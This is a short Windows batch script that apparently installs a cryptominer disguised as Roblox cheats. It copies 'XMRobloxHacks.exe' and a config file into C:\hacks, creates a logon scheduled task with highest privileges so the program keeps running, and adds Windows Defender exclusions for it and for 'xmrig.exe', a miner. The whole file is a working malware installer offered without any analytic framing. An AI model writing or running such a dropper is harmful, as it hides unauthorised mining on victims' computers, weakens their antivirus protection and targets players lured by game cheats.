cd /d "%~dp0"
mkdir C:\hacks\
copy XMRobloxHacks.exe C:\hacks 
copy config.json C:\hacks
schtasks /create /tn "ROBLOX" /tr "C:\hacks\XMRobloxHacks.exe" /sc onlogon /rl highest /f
powershell -Command "Add-MpPreference -ExclusionProcess 'xmrig.exe'"
powershell -Command "Add-MpPreference -ExclusionProcess 'XMRobloxHacks.exe'"
exit